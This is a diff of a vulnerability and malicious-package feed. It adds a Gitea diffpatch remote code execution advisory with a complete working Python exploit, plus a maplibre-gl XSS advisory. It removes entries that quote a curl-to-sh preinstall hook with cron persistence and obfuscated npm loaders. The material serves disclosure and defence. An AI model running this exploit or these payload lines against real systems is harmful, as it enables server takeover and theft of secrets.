@@ -5,20 +5,23 @@
   "pagination": {
     "page": 1,
     "pageSize": 50,
-    "totalPages": 5,
-    "totalItems": 235,
+    "totalPages": 22,
+    "totalItems": 1089,
     "hasNextPage": true,
     "hasPrevPage": false
   },
   "cves": [
     {
       "id": "CVE-2026-60004",
-      "summary": "Gitea: Remote Code Execution via diffpatch Git Hook Installation",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": null,
-      "modified": null,
-      "cwe": null,
+      "summary": "### Summary\n\nGitea's `diffpatch` endpoint can be abused to install and execute a Git hook from repository-controlled content.\n\nAn attacker with ordinary write access to a repository can execute arbitrary shell commands as the Gitea OS user. With default open registration, an unauthenticated visitor can obtain the required write access by registering an account and creating a repository.\n\n### Details\n\n`services/repository/files/patch.go` applies attacker-controlled patches in a shared bare temporary clone:\n\n```go\ncmdApply := gitcmd.NewCommand(\"apply\", \"--index\", \"--recount\", \"--cached\", \"--binary\")\nif git.DefaultFeatures().CheckVersionAtLeast(\"2.32\") {\n    cmdApply.AddArguments(\"-3\")\n}\n````\n\nSubmitting the same patch twice creates an add/add collision. Git's three-way fallback checks the indexed path out even though the operation is performed with `--cached`.\n\nIn a bare clone, the repository root is `$GIT_DIR`. As a result, an executable entry named:\n\n```text\nhooks/post-index-change\n```\n\nbecomes a live Git hook.\n\nGit invokes the hook while writing the index, allowing repository-controlled content to execute arbitrary commands as the Gitea service account.\n\nThe hook's return value is not propagated to the `diffpatch` response.\n\nThe attached PoC stores command output in Git objects and creates a branch containing the result, so no outbound connection is required. The result is fetched through authenticated smart HTTP.\n\n### PoC\n\nThe supplied `gitea_diffpatch_rce_poc.py` uses an existing Gitea account. Run it against a test instance where the account can create a repository.\n\nSet the account password:\n\n```bash\nexport GITEA_PASSWORD='account-password'\n```\n\nExecute a command through the `diffpatch` chain:\n\n```bash\npython3 ./gitea_diffpatch_rce_poc.py \\\n  https://gitea.example \\\n  pocuser \\\n  'id; uname -srm; pwd'\n```\n\nThe script:\n\n* Creates an initialized private repository.\n* Submits the same executable-hook patch twice.\n* Fetches the result branch.\n* Prints the command's combined stdout, stderr, and exit status.\n* Prints the evidence repository, ref, and commit IDs to stderr.\n\nExpected output resembles:\n\n```text\nuid=1000(git) gid=1000(git) groups=1000(git)\nLinux ...\n/data/gitea/tmp/...\n\n[exit-status=0]\n```\n\nThe trigger requires:\n\n* Git 2.32 or newer.\n* An enabled `diffpatch` route.\n* A writable and executable temporary filesystem.\n\nOpen registration is required only for the no-prior-credentials attack path.\n\n### Impact\n\nThis is remote command execution as the Gitea service account (`CWE-94`).\n\nDepending on deployment isolation and the privileges of the Gitea OS user, successful exploitation may expose:\n\n* `app.ini` and Gitea application secrets.\n* Process environment secrets.\n* Mounted repositories.\n* Database credentials and database contents.\n* OAuth and integration credentials.\n* Other internal or externally reachable services.\n\nWith open registration enabled, the attack can be performed by an unauthenticated visitor after registering a normal account and creating a repository.\n\n<img width=\"928\" height=\"687\" alt=\"Screenshot 2026-07-25 at 14 45 44\" src=\"https://github.com/user-attachments/assets/e7ce9fe7-bcab-4539-82fc-14c3856bda1c\" />\n\n```python\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nGitea RCE PoC – authorized testing only.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport getpass\nimport hashlib\nimport json\nimport os\nfrom pathlib import Path\n\nimport secrets\nimport shlex\nimport shutil\nimport subprocess\nimport sys\nimport tempfile\n\nfrom typing import Any\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nTIMEOUT    = 30.0\nUSER_AGENT = \"gitea-rce-poc/2.0\"\n\n_RST  = \"\\033[0m\"\n_DIM  = \"\\033[2m\"\n_GRN  = \"\\033[38;5;46m\"     # bright green\n_RED  = \"\\033[31m\"           # red for errors\n\ndef _g(t: str) -> str: return f\"{_GRN}{t}{_RST}\"\ndef _r(t: str) -> str: return f\"{_RED}{t}{_RST}\"\ndef _d(t: str) -> str: return f\"{_DIM}{t}{_RST}\"\n\ndef log_star(msg: str) -> None: print(f\"{_g('[*]')} {_d(msg)}\")\ndef log_ok  (msg: str) -> None: print(f\"{_g('[+]')} {_g(msg)}\")\ndef log_err (msg: str) -> None: print(f\"{_r('[-]')} {_r(msg)}\")\n\n_SEP = \"  \" + \"═\" * 44\nBANNER = f\"{_SEP}\\n  GITEA  REMOTE CODE EXECUTION  POC\\n{_SEP}\"\n\ndef print_banner(url: str, version: str | None = None,\n                 command: str | None = None) -> None:\n    print()\n    for line in BANNER.splitlines():\n        print(_g(line))\n    print()\n    ver = version or \"unknown\"\n    print(_g(\"  \" + \"-\" * 54))\n    print(_g(f\"  Target        : {url}\"))\n    print(_g(f\"  Version       : {ver}\"))\n    if command:\n        print(_g(f\"  Command       : {command}\"))\n    print(_g(\"  \" + \"-\" * 54))\n    print()\n\nclass PocError(RuntimeError):\n    pass\n\nclass GiteaClient:\n    def __init__(self, base_url: str, username: str, password: str) -> None:\n        parsed = urllib.parse.urlsplit(base_url)\n        if parsed.scheme not in {\"http\", \"https\"} or not parsed.netloc:\n            raise PocError(\"URL must be an absolute http:// or https:// URL\")\n        if parsed.query or parsed.fragment:\n            raise PocError(\"URL must not contain a query string or fragment\")\n        self.base_url = base_url.rstrip(\"/\")\n        self.username = username\n        self.password = password\n        encoded = base64.b64encode(\n            f\"{username}:{password}\".encode()\n        ).decode(\"ascii\")\n        self.authorization = f\"Basic {encoded}\"\n\n    def api(\n        self,\n        method: str,\n        path: str,\n        payload: dict[str, Any] | None = None,\n    ) -> tuple[int, Any]:\n        data = None\n        if payload is not None:\n            data = json.dumps(payload, separators=(\",\", \":\")).encode()\n        req = urllib.request.Request(\n            self.base_url + path,\n            data=data,\n            method=method,\n            headers={\n                \"Accept\": \"application/json\",\n                \"Authorization\": self.authorization,\n                \"Content-Type\": \"application/json\",\n                \"User-Agent\": USER_AGENT,\n            },\n        )\n        try:\n            with urllib.request.urlopen(req, timeout=TIMEOUT) as r:\n                raw = r.read()\n                return r.status, json.loads(raw) if raw else None\n        except urllib.error.HTTPError as exc:\n            body = exc.read().decode(\"utf-8\", errors=\"replace\")[:2_000]\n            raise PocError(f\"{method} {path} → HTTP {exc.code}: {body}\") from exc\n        except urllib.error.URLError as exc:\n            raise PocError(f\"{method} {path} failed: {exc.reason}\") from exc\n        except json.JSONDecodeError:\n            raise PocError(f\"{method} {path} returned invalid JSON\")\n\ndef blob_oid(content: bytes) -> str:\n    return hashlib.sha1(\n        f\"blob {len(content)}\\0\".encode(\"ascii\") + content\n    ).hexdigest()\n\ndef build_hook(command: str, leak_ref: str) -> bytes:\n    qcmd = shlex.quote(command)\n    qref = shlex.quote(f\"refs/heads/{leak_ref}\")\n    return (\n        \"#!/bin/sh\\n\"\n        'git_dir=$(git rev-parse --absolute-git-dir) || exit 1\\n'\n        'origin_objects=$(sed -n \"1p\" \"$git_dir/objects/info/alternates\") || exit 2\\n'\n        'case \"$origin_objects\" in\\n'\n        '  /*) ;;\\n'\n        '  *) origin_objects=\"$git_dir/objects/$origin_objects\" ;;\\n'\n        \"esac\\n\"\n        'origin_git=${origin_objects%/objects}\\n'\n        '[ \"$origin_git\" != \"$origin_objects\" ] || exit 3\\n'\n        f\"output_blob=$({{ /bin/sh -c {qcmd}; \"\n        'command_status=$?; printf \"\\\\n[exit-status=%s]\\\\n\" \"$command_status\"; } 2>&1 | '\n        'git --git-dir=\"$origin_git\" hash-object -w --stdin) || exit 4\\n'\n        'tree=$(printf \"100644 blob %s\\\\toutput\\\\n\" \"$output_blob\" | '\n        'git --git-dir=\"$origin_git\" mktree) || exit 5\\n'\n        'commit=$(printf \"command output\\\\n\" | '\n        \"GIT_AUTHOR_NAME=poc GIT_AUTHOR_EMAIL=poc@example.invalid \"\n        \"GIT_COMMITTER_NAME=poc GIT_COMMITTER_EMAIL=poc@example.invalid \"\n        'git --git-dir=\"$origin_git\" commit-tree \"$tree\") || exit 6\\n'\n        f'git --git-dir=\"$origin_git\" update-ref {qref} \"$commit\" || exit 7\\n'\n        \"exit 0\\n\"\n    ).encode()\n\ndef build_patch(hook: bytes) -> str:\n    lc  = hook.count(b\"\\n\")\n    hdr = (\n        \"diff --git a/hooks/post-index-change b/hooks/post-index-change\\n\"\n        \"new file mode 100755\\n\"\n        f\"index {'0'*40}..{blob_oid(hook)}\\n\"\n        \"--- /dev/null\\n\"\n        \"+++ b/hooks/post-index-change\\n\"\n        f\"@@ -0,0 +1,{lc} @@\\n\"\n    ).encode()\n    return (hdr + b\"\".join(b\"+\" + l for l in hook.splitlines(keepends=True))).decode()\n\ndef run_git(git: str, arguments: list[str], env: dict[str, str]) -> bytes:\n    try:\n        result = subprocess.run(\n            [git, *arguments], env=env,\n            stdin=subprocess.DEVNULL,\n            stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n            check=False, timeout=TIMEOUT,\n        )\n    except subprocess.TimeoutExpired as exc:\n        raise PocError(f\"git timed out after {TIMEOUT:g}s\") from exc\n    except OSError as exc:\n        raise PocError(f\"could not run git: {exc}\") from exc\n    if result.returncode != 0:\n        err = result.stderr.decode(\"utf-8\", errors=\"replace\")[:2_000].strip()\n        raise PocError(f\"git exit {result.returncode}: {err}\")\n    return result.stdout\n\ndef fetch_output(git: str, client: GiteaClient,\n                 owner: str, repo: str, leak_ref: str) -> bytes:\n    remote = (\n        f\"{client.base_url}/\"\n        f\"{urllib.parse.quote(owner, safe='')}/\"\n        f\"{urllib.parse.quote(repo, safe='')}.git\"\n    )\n    with tempfile.TemporaryDirectory(prefix=\"gitea-poc-\") as tmp:\n        bare      = Path(tmp) / \"fetch.git\"\n        auth_cfg  = Path(tmp) / \"auth.config\"\n        fd = os.open(auth_cfg, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)\n        with os.fdopen(fd, \"w\", encoding=\"utf-8\") as f:\n            f.write(f\"[http]\\n\\textraHeader = Authorization: {client.authorization}\\n\")\n        env = {**os.environ, \"GIT_TERMINAL_PROMPT\": \"0\"}\n        run_git(git, [\"init\", \"--bare\", \"--quiet\", str(bare)], env)\n        run_git(git, [\n            \"-C\", str(bare), \"-c\", f\"include.path={auth_cfg}\",\n            \"fetch\", \"--quiet\", \"--no-tags\",\n            remote, f\"refs/heads/{leak_ref}\",\n        ], env)\n        return run_git(git, [\"-C\", str(bare), \"show\", \"FETCH_HEAD:output\"], env)\n\ndef split_output(raw: bytes) -> tuple[str, int | None]:\n    text  = raw.decode(\"utf-8\", errors=\"replace\")\n    lines = text.splitlines()\n    status: int | None = None\n    if lines:\n        t = lines[-1].strip()\n        if t.startswith(\"[exit-status=\") and t.endswith(\"]\"):\n            try:    status = int(t[len(\"[exit-status=\"):-1])\n            except ValueError: pass\n            else:   lines.pop()\n    return \"\\n\".join(lines).rstrip(\"\\n\"), status\n\ndef parse_args() -> argparse.Namespace:\n    p = argparse.ArgumentParser(description=\"Gitea RCE PoC\")\n    p.add_argument(\"url\",      help=\"Gitea base URL\")\n    p.add_argument(\"username\", help=\"existing Gitea username\")\n    p.add_argument(\"command\",  help=\"shell command to execute on target\")\n    return p.parse_args()\n\ndef main() -> int:\n    args = parse_args()\n    if \"\\0\" in args.command:\n        raise PocError(\"command must not contain a NUL character\")\n\n    password = os.environ.get(\"GITEA_PASSWORD\") or getpass.getpass(\n        _g(\"[?]\") + \" password: \"\n    )\n    if not password:\n        raise PocError(\"password must not be empty\")\n\n    git = shutil.which(\"git\")\n    if git is None:\n        raise PocError(\"git executable not found in PATH\")\n\n    client = GiteaClient(args.url, args.username, password)\n\n    # version probe (pre-banner)\n    log_star(\"probing target...\")\n    version: str | None = None\n    try:\n        r = urllib.request.Request(\n            client.base_url + \"/api/v1/version\",\n            headers={\"Accept\": \"application/json\", \"User-Agent\": USER_AGENT},\n        )\n        with urllib.request.urlopen(r, timeout=TIMEOUT) as resp:\n            version = json.loads(resp.read()).get(\"version\", \"unknown\")\n    except Exception:\n        version = \"unknown\"\n    print_banner(client.base_url, version, args.command)\n\n    log_star(f\"target={client.base_url}  user={args.username}  cmd={args.command}\")\n    print()\n\n    # step 1 – authenticate\n    log_star(\"authenticating...\")\n    sc, acct = client.api(\"GET\", \"/api/v1/user\")\n    if sc != 200 or not isinstance(acct, dict):\n        log_err(\"authentication failed\"); raise PocError(\"auth failed\")\n    owner = acct.get(\"login\")\n    if not isinstance(owner, str) or not owner:\n        log_err(\"no login in response\"); raise PocError(\"no login\")\n    log_ok(f\"logged in as {owner}  ({version})\")\n\n    # step 2 – create repo\n    unique   = secrets.token_hex(5)\n    repo     = f\"test-repo-{unique}\"\n    leak_ref = f\"output-{unique}\"\n    log_star(\"creating repository...\")\n    sc, _ = client.api(\"POST\", \"/api/v1/user/repos\", {\n        \"name\": repo, \"private\": True,\n        \"auto_init\": True, \"default_branch\": \"main\",\n        \"object_format_name\": \"sha1\",\n    })\n    if sc != 201:\n        log_err(\"repo creation failed\"); raise PocError(\"repo creation failed\")\n    log_ok(f\"created repo {owner}/{repo}\")\n\n    # steps 3–4 – deliver payloads\n    body = {\n        \"content\": build_patch(build_hook(args.command, leak_ref)),\n        \"message\": \"initial commit\",\n        \"branch\": \"main\", \"new_branch\": \"main\",\n    }\n    ep = (\n        f\"/api/v1/repos/{urllib.parse.quote(owner, safe='')}/\"\n        f\"{urllib.parse.quote(repo, safe='')}/diffpatch\"\n    )\n    commits: list[str] = []\n    for cycle in (1, 2):\n        log_star(f\"delivering payload {cycle}/2...\")\n        sc, resp = client.api(\"POST\", ep, body)\n        try:\n            commit = resp[\"commit\"][\"sha\"]\n        except (KeyError, TypeError) as exc:\n            log_err(f\"payload {cycle}/2 rejected\")\n            raise PocError(f\"cycle {cycle} no commit\") from exc\n        if sc != 201:\n            log_err(f\"payload {cycle}/2 failed\")\n            raise PocError(f\"cycle {cycle} failed\")\n        commits.append(commit)\n        log_ok(f\"payload {cycle}/2 accepted  commit={commit[:16]}\")\n\n    # step 5 – retrieve output\n    log_star(\"retrieving output...\")\n    output = fetch_output(git, client, owner, repo, leak_ref)\n    log_ok(\"operation complete\")\n\n    # command output\n    cmd_out, exit_status = split_output(output)\n    print()\n    log_ok(f\"{args.command}:\")\n    print(_g(\"---\"))\n    if cmd_out:\n        for line in cmd_out.splitlines():\n            print(_g(line))\n    else:\n        print(_d(\"<no output>\"))\n    print(_g(\"---\"))\n    if exit_status == 0:\n        log_ok(f\"exit status: {exit_status}\")\n    elif exit_status is None:\n        log_star(\"exit status: unknown\")\n    else:\n        log_err(f\"exit status: {exit_status}\")\n\n    return 0\n\nif __name__ == \"__main__\":\n    try:\n        raise SystemExit(main())\n    except PocError as exc:\n        log_err(str(exc))\n        raise SystemExit(1) from None\n\n```",
+      "cvssScore": 9.8,
+      "severity": "Critical",
+      "published": "2026-09-08",
+      "modified": "2026-09-08",
+      "cwe": {
+        "cwe_id": "CWE-94",
+        "name": "Improper Control of Generation of Code ('Code Injection')"
+      },
       "references": [
         "https://github.com/go-gitea/gitea/security/advisories/GHSA-rcr6-4jqh-j84m",
         "https://nvd.nist.gov/vuln/detail/CVE-2026-60004",
@@ -26,807 +29,821 @@
         "https://github.com/go-gitea/gitea/pull/38638",
         "https://github.com/go-gitea/gitea/commit/470d34b1de87d901bd9135564d5ee18c0d339e82"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "gitea.dev go"
+      ],
       "isExploited": true
     },
     {
-      "id": "CVE-2025-1889",
-      "summary": "picklescan before 0.0.22 only considers standard pickle file extensions in the scope for its vulnerability scan. An attacker could craft a malicious model that uses Pickle and include a malicious pickle file with a non-standard file extension. Because the malicious pickle file inclusion is not considered as part of the scope of picklescan, the file would pass security checks and appear to be safe, when it could instead prove to be problematic.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2025-03-03",
-      "modified": "2027-07-09",
-      "cwe": null,
+      "id": "CVE-2026-85061",
+      "summary": "### Impact\n`DOM.sanitize()` in `src/util/dom.ts` iterated `elem.attributes` (a live `NamedNodeMap`) while calling `elem.removeAttribute()` in the same loop. Removing an attribute shifts subsequent attributes down by one index, causing the iterator to skip the adjacent attribute.\n\nAn attacker can provide an HTML payload with consecutive dangerous attributes (such as `<details open onload=\"1\" ontoggle=\"...\">`). The first attribute is stripped while the second survives and executes upon insertion into `innerHTML` via the attribution control without requiring user interaction (zero-click XSS).\n\nApplications rendering untrusted/third-party style attribution strings or user-supplied custom attributions are impacted.\n\n### Patches\nThe issue has been resolved by creating a static snapshot of attributes using `Array.from(elem.attributes)` before iteration. Please upgrade to `maplibre-gl` version **6.4.1** (or latest).\n\n### Workarounds\nSanitizing the attribute field of a source before passing it down to maplibre",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2026-09-08",
+      "modified": "2026-09-08",
+      "cwe": {
+        "cwe_id": "CWE-79",
+        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+      },
       "references": [
-        "https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1889",
-        "https://github.com/advisories/GHSA-769v-p64c-89pr"
+        "https://github.com/maplibre/maplibre-gl-js/security/advisories/GHSA-jrc7-96c5-q579",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-85061",
+        "https://github.com/maplibre/maplibre-gl-js/pull/8189",
+        "https://github.com/maplibre/maplibre-gl-js/commit/1da69f3cd913a39fa948708e01478663bf48bc27",
+        "https://github.com/maplibre/maplibre-gl-js/releases/tag/v6.4.1"
       ],
       "vulnerableProducts": [
-        "picklescan PyPI"
+        "maplibre-gl npm"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2024-8309",
-      "summary": "A vulnerability in the GraphCypherQAChain class of langchain-ai/langchain-community version 0.2.5 allows for SQL injection through prompt injection. This vulnerability can lead to unauthorized data manipulation, data exfiltration, denial of service (DoS) by deleting all data, breaches in multi-tenant security environments, and data integrity issues. Attackers can create, update, or delete nodes and relationships without proper authorization, extract sensitive data, disrupt services, access data across different tenants, and compromise the integrity of the database.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2024-11-05",
-      "modified": "2027-07-09",
-      "cwe": null,
-      "references": [
-        "https://huntr.com/bounties/8f4ad910-7fdc-4089-8f0a-b5df5f32e7c5",
-        "https://huntr.com/bounties/8f4ad910-7fdc-4089-8f0a-b5df5f32e7c5",
-        "https://github.com/langchain-ai/langchain/commit/c2a3021bb0c5f54649d380b42a0684ca5778c255",
-        "https://github.com/advisories/GHSA-45pg-36p6-83v9"
-      ],
-      "vulnerableProducts": [
-        "langchain-community PyPI"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15520",
-      "summary": "package.json declares a dependency whose key equals the package's own name (ring-device-settings-library) and whose value is a raw HTTPS URL pointing at an off-registry host: https://repo.securityctrl.com/ring-device-settings-library. On `npm install`, npm resolves that URL rather than a registry version range and installs whatever bytes the host returns, running any lifecycle scripts contained in the fetched artifact. There is no version pin, no integrity hash, and no signature check, and the host is unrelated to any npm registry. The shipped package contents are otherwise an inert placeholder, so the manifest line is the entire installed surface: whoever controls repo.securityctrl.com controls the code that executes on the installer's machine on every install. The self-referential dependency name, combined with the implausibly high version (45.0.0), is also a dependency-confusion shape that can win resolution against an internally-named package.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/ring-device-settings-library/v/45.0.0",
-        "https://www.npmjs.com/package/ring-device-settings-library/v/30.0.0"
-      ],
-      "vulnerableProducts": [
-        "ring-device-settings-library npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15502",
-      "summary": "package.json declares a preinstall hook that shells out via node -e / child_process to curl http://216.126.236.46/x.sh over plain HTTP and pipes the response to sh, then appends a crontab entry ('*/30 * * * * curl -s 216.126.236.46/x.sh|sh') that re-fetches and re-executes the same URL every 30 minutes. The shipped index.js is an inert stub exporting a no-op login function, so the manifest's lifecycle hook is the package's only real behavior. Running npm install executes attacker-controlled code from a bare-IP HTTP endpoint on the installer's host and establishes persistent remote code delivery via cron; the payload at that URL is mutable by the operator of the IP.\n\nThe OpenSSF Package Analysis project identified 'grafeno-auth' @ 1.0.0 (npm) as malicious.\n\nIt is considered malicious because:\n\n- The package executes one or more commands associated with malicious behavior.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/grafeno-auth/v/1.0.0"
-      ],
-      "vulnerableProducts": [
-        "grafeno-auth npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15498",
-      "summary": "package.json declares a dependency whose key equals the package's own name (`aws-blog`) with a value of `https://repo.securityctrl.com/aws-blog` instead of a registry version range. On `npm install`, npm fetches whatever tarball bytes that URL currently returns and installs it, running any lifecycle scripts inside it. There is no version pin and no integrity hash, so the executed code is whatever the operator of repo.securityctrl.com serves at install time and can change silently between installs. The shipped source is an inert stub, so the manifest line is the entire published surface of the package. The dependency-confusion shape (self-named key, implausibly high 45.0.0 version to win resolution against an internal `aws-blog`, host unrelated to any AWS or npm infrastructure) further indicates targeting of installers who expect an internal package by this name.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/aws-blog/v/45.0.1",
-        "https://www.npmjs.com/package/aws-blog/v/45.0.2",
-        "https://www.npmjs.com/package/aws-blog/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "aws-blog npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15494",
-      "summary": "The tarball ships a binding.gyp at the package root whose `conditions` field abuses GYP's Python expression evaluator to walk `().__class__.__base__.__subclasses__()` to `catch_warnings`, retrieve `__import__` via `_module.__builtins__`, load `os`, and call `os.system('node 3FWCvzduYZg.js')` (the command is Unicode-escape-obfuscated). Because a binding.gyp at the package root causes `npm install` to invoke `node-gyp rebuild` automatically — even with no lifecycle script declared — this executes shell on every installer during configure. The launched sibling file 3FWCvzduYZg.js is a 5.4 MB blob consisting of a single `try{Function(function(a,k){...XOR...}([large int array], key))(...)}` construct: an XOR-decoded string passed to `Function()` and invoked, a loader/dropper shape whose body cannot be inspected without evaluation. The referenced native source (`dog.c`) is absent from the tarball, so the binding.gyp has no legitimate build purpose. package.json declares `\"files\": [\"dist\"]`, but binding.gyp and 3FWCvzduYZg.js sit at the tarball root and are honored regardless — an inclusion gap consistent with smuggled payload added outside the declared publish surface. The package's advertised purpose is a React Query code generator, which requires no native addon and no multi-megabyte obfuscated JS payload.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/@7nohe/openapi-react-query-codegen/v/3.0.4",
-        "https://www.npmjs.com/package/@7nohe/openapi-react-query-codegen/v/1.6.3",
-        "https://www.npmjs.com/package/@7nohe/openapi-react-query-codegen/v/3.0.3",
-        "https://www.npmjs.com/package/@7nohe/openapi-react-query-codegen/v/0.5.4",
-        "https://www.npmjs.com/package/@7nohe/openapi-react-query-codegen/v/0.5.5"
-      ],
-      "vulnerableProducts": [
-        "@7nohe/openapi-react-query-codegen npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15544",
-      "summary": "package.json declares a self-referential dependency where the key `sentrykit` maps to the bare HTTPS URL `https://repo.securityctrl.com/sentrykit` instead of a registry version range. On `npm install`, npm fetches whatever tarball that URL returns and installs it, running any lifecycle scripts contained in the fetched artifact. The source is unpinned, integrity-unchecked, and not the official npm registry; the shipped package body is a one-line stub, so the manifest itself is the entire delivery mechanism. The dependency key equals the package's own name and the version constraint (30.0.0) is implausibly high for a package of this size, matching the dependency-confusion smuggling shape where a high version number is used to win resolution against an internal package of the same name. Whoever controls repo.securityctrl.com controls code executed on the installer's machine at install time.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/sentrykit/v/30.0.0"
-      ],
-      "vulnerableProducts": [
-        "sentrykit npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15526",
-      "summary": "package.json at line 11 declares a dependency whose key equals this package's own name (analytics-web-client) and whose source is a bare HTTPS URL (https://repo.securityctrl.com/analytics-web-client) rather than a registry version range. On npm install, npm fetches whatever bytes that host serves and runs any lifecycle scripts they contain, with no version pin and no integrity check. The shipped index.js is an inert stub, so the manifest line is the entire published surface: whoever controls repo.securityctrl.com controls code executed on the installer's machine at install time. The self-referential dependency name additionally matches the dependency-confusion shape, aimed at winning resolution against an internal package of the same name.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/analytics-web-client/v/30.0.0"
-      ],
-      "vulnerableProducts": [
-        "analytics-web-client npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15530",
-      "summary": "package.json declares a dependency whose key equals the package's own name (`confluence-create-content`) and whose value is a bare HTTPS URL, `https://repo.securityctrl.com/confluence-create-content`, instead of a registry version range. On `npm install`, npm fetches whatever bytes that URL returns and installs them, running any lifecycle scripts contained in them with no version pin and no integrity check. The shipped `index.js` is an inert stub, so the manifest URL is effectively the entire delivered payload. The self-named dependency shape also creates dependency-confusion pressure: any environment resolving this package name pulls content from the third-party host rather than the registry.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/confluence-create-content/v/30.0.0"
-      ],
-      "vulnerableProducts": [
-        "confluence-create-content npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15531",
-      "summary": "package.json declares a dependency whose value is a bare HTTPS URL (https://repo.securityctrl.com/confluence-editor) rather than a semver range published to the npm registry. The dependency key equals the package's own name, matching a dependency-confusion shape, and the version 30.0.0 is implausibly high for a package of this name. On npm install, npm fetches whatever tarball that URL currently returns and executes any lifecycle scripts inside it, with no version pin, no integrity check, and no registry provenance. The shipped index.js is an inert stub, so the manifest line itself is the entire published attack surface — the actual code that runs on installers is served from repo.securityctrl.com and can be changed by whoever controls that host at any time.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/confluence-editor/v/30.0.0"
-      ],
-      "vulnerableProducts": [
-        "confluence-editor npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15532",
-      "summary": "package.json declares a self-referential dependency whose key equals the package's own name (`confluence-rest`) and whose value is the bare HTTPS URL `https://repo.securityctrl.com/confluence-rest` rather than a semver range. On `npm install`, npm resolves that URL and installs whatever tarball the host returns, running any lifecycle scripts inside it, with no version pin and no integrity check. The shipped index.js is an inert stub, so the manifest URL is the entire code-delivery path for the package. Whoever controls repo.securityctrl.com controls code that executes on the installer's machine at install time, and the self-referential dependency-confusion shape (same name as the published package, version 30.0.0 sufficient to win resolution against a legitimate internal package of the same name) indicates targeting of internal-package resolution.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/confluence-rest/v/30.0.0"
-      ],
-      "vulnerableProducts": [
-        "confluence-rest npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15543",
-      "summary": "package.json line 11 declares a dependency whose key equals the package's own name (`prm-bundles`) and whose value is a bare HTTPS URL (`https://repo.securityctrl.com/prm-bundles`) rather than a registry version range. On `npm install`, npm fetches whatever tarball that URL returns and installs it, executing any lifecycle scripts contained in it, with no version pin and no integrity check. Because the shipped source in this package is an inert placeholder, the manifest is the entire payload delivery mechanism, and the code that ultimately runs on the installer is whatever the operator of repo.securityctrl.com serves at install time. The implausibly high version (45.0.0) combined with the self-referential name is consistent with a dependency-confusion redirection targeting an internal package name.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/prm-bundles/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "prm-bundles npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15536",
-      "summary": "package.json declares a dependency whose key equals the package's own name (`ir-annuities-client-authentication-module`) and whose value is a plain HTTPS URL to a non-registry host (`https://repo.securityctrl.com/ir-annuities-client-authentication-module`) instead of a semver range. On `npm install`, npm fetches whatever bytes that URL currently returns and installs them as this dependency, with no version pin, no integrity hash, and no registry provenance; any lifecycle scripts contained in the fetched artifact execute on the installer. The dependency key matching the package's own name creates a dependency-confusion shape that can win resolution against an internal package of the same name. The shipped index.js is an inert stub, so the manifest itself is the delivery mechanism — the absence of local scripts does not prevent the fetch or its lifecycle execution.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/ir-annuities-client-authentication-module/v/30.0.0"
-      ],
-      "vulnerableProducts": [
-        "ir-annuities-client-authentication-module npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15492",
